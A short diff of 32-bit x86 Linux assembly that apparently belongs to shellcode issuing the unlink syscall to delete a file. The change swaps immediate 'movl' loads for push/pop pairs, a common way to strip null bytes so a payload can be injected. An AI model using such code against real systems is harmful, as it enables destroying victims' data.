@@ -21,8 +21,10 @@
 	movb	$SYS_unlink,%al		/* unlink to rm a file */
 	movl	%esi,%ebx			/* syscall arg 2: string pathname */
 
-	movl $0x08, %eax
-	movl $0x02, %ecx
+	push $0x08
+	pop %eax
+	push $0x02 
+	pop %ecx
 
 	orl %ecx, %eax
 	int	$0x80					/* invoke call */
